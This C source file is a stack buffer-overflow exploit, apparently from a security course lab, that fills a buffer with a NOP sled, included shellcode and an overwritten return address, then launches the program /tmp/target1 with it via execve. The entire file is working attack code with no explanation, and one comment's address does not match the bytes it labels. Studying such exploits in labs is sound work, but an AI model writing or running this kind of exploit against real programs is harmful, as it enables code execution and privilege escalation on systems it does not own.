#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];

  int i;
  char crack_str[189];

  for(i = 0; i < 135; i++) crack_str[i] = '\x90'; //no-op sled
  strcpy(&crack_str[135], shellcode); //shellcode
  strcpy(&crack_str[180], "\x40\xfd\xff\xbf\x40\xfd\xff\xbf"); //BFFFF70C = somewhere in nopsled

  args[0] = TARGET;
  args[1] = crack_str;
  args[2] = NULL;
  env[0] = NULL;
  //printf("%s\n", crack_str);

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
